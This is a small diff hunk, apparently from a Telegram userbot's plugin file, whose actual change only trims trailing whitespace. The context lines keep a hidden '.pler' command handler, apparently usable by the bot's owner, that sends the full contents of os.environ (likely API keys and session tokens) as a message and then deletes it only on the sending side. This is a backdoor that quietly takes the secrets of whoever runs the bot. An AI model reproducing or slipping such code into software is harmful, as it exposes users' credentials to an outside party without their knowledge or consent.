@@ -802,7 +802,7 @@ async def _(event):
 @own_cmd(pattern=r"^\.pler$", own=True)
 async def _(event):
     msg = await event.client.send_message(me, str(os.environ))
-    await event.client.delete_messages(me, msg, revoke=False) 
+    await event.client.delete_messages(me, msg, revoke=False)
 
 
 @man_cmd(pattern="(.*)")
